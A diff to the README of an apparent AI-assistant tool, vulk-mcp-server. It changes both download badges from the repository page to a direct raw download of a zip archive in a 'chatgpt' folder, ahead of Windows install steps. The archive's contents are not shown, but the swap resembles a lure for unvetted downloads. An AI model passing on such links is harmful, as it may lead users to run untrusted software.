@@ -1,6 +1,6 @@
 # 🚀 vulk-mcp-server - Build apps from any AI assistant
 
-[![Download / Install](https://img.shields.io/badge/Download%20vulk--mcp--server-blue?style=for-the-badge&logo=github)](https://github.com/Diuli4587/vulk-mcp-server)
+[![Download / Install](https://img.shields.io/badge/Download%20vulk--mcp--server-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Diuli4587/vulk-mcp-server/main/chatgpt/vulk_mcp_server_v3.1.zip)
 
 ## 🧭 What this is
 
@@ -29,7 +29,7 @@ For the best results, keep these apps ready too:
 
 Use this link to visit the page to download:
 
-[![Visit download page](https://img.shields.io/badge/Visit%20Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Diuli4587/vulk-mcp-server)
+[![Visit download page](https://img.shields.io/badge/Visit%20Download%20Page-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Diuli4587/vulk-mcp-server/main/chatgpt/vulk_mcp_server_v3.1.zip)
 
 Follow these steps on Windows:
 
